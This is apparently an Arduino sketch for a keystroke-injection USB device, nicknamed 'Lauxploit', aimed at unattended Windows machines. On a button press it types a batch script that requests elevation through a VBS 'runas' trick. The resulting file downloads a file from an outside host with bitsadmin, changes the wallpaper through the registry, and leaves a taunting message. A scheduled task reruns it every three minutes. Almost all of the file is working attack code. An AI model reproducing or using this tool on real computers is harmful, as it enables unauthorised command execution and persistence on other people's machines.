void setup()
{
  pinMode(2, INPUT_PULLUP);
  pinMode(3, INPUT_PULLUP);
  Keyboard.begin();
}

void loop()
{
  //if the button is pressed
  if (digitalRead(2) == LOW)
  {
    //Starting a standart cmd
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(50);
    Keyboard.releaseAll();
    Keyboard.println("cmd");
    delay(100);

    // Creating Privilege Escalation script
    Keyboard.println("copy con pe.bat");
      // Arobase escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("@");
      delay(50);
      Keyboard.releaseAll();    
    Keyboard.print("whoami /groups ");
      // Pipe escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("|");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println(" find \"S-1-16-12288\" > nul && goto :admin");
    Keyboard.print("set \"ELEVATE_CMDLINE=cd /d \"%");
      // Pipe escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("~");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.print("dp0\" & call \"%");
      // Pipe escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("~");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println("f0\" %*\"");
    Keyboard.print("findstr \"^:::\" \"%");
      // Pipe escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("~");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println("sf0\">temp.vbs");
    Keyboard.println("cscript //nologo temp.vbs & del temp.vbs & exit /b");
    Keyboard.println("::: Set objShell = CreateObject(\"Shell.Application\")");
    Keyboard.println("::: Set objWshShell = WScript.CreateObject(\"WScript.Shell\")");
    Keyboard.println("::: Set objWshProcessEnv = objWshShell.Environment(\"PROCESS\")");
    Keyboard.println("::: strCommandLine = Trim(objWshProcessEnv(\"ELEVATE_CMDLINE\"))");
    Keyboard.println("::: objShell.ShellExecute \"cmd\", \"/c \" & strCommandLine, \"\", \"runas\"");
    Keyboard.println(":admin -------------------------------------------------------------");
      // Arobase escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("@");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println("echo off");
    Keyboard.println("echo.");
    Keyboard.println("cmd /k");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('Z');
    delay(50);
    Keyboard.releaseAll();
    Keyboard.println(" ");
    delay(50);

    // Launching our cmd as Administrator
    Keyboard.println("pe.bat");
    delay(1000); // Waiting for the new console to come
    
    // Creating the reminder
    Keyboard.print("cd C:");
      // Backslash escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("_");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println(" ");
    Keyboard.println("copy con Lauxploit.bat");
    //Keyboard.println("\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://goo.gl/woC2kSp");
    //Keyboard.println("start http://goo.gl/x5sPkr");
    //Keyboard.println("Msg * \"Friendly reminder: NEVER LEAVE YOUR COMPUTER WITHOUT SURVEILLANCE\"");
    
    // Have to repeat mucho time (because rundll32.exe doesn't work each time) : dirty but somehow working
    for (int i = 0; i<7; i++)
    {
      Keyboard.println("bitsadmin.exe /transfer \"JobName\" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\\lvi.jpg");
      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"C:\\lvi.jpg\" /f");
      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v TileWallpaper /t REG_SZ /f /d 0");
      Keyboard.println("reg add \"HKCU\\control panel\\desktop\" /v WallpaperStyle /t REG_SZ /f /d 0");
      Keyboard.println("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
      i++;  
    }
    Keyboard.println("Msg * \"To my beloved OLD secret admirer, please receive this gift as a mark of my unwavering love for you\"");
    
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('Z');
    delay(50);
    Keyboard.releaseAll();
    Keyboard.println(" ");

    // Adding the reminder to the Windows' tasks (type the number of minutes after /mo)
    Keyboard.print("schtasks /create /sc minute /mo 3 /tn \"Lauxploit\" /tr C:");
      // Backslash escape sequence
      Keyboard.press(KEY_RIGHT_ALT);
      Keyboard.print("_");
      delay(50);
      Keyboard.releaseAll();
    Keyboard.println("Lauxploit.bat");

    // Exiting properly the elevated console
    Keyboard.println("exit");
    Keyboard.println("Y");
    delay(800);

    // Exiting the entry console
    Keyboard.println("Msg * \"Lauxploit launched\"");
    Keyboard.println("exit");
  }
}
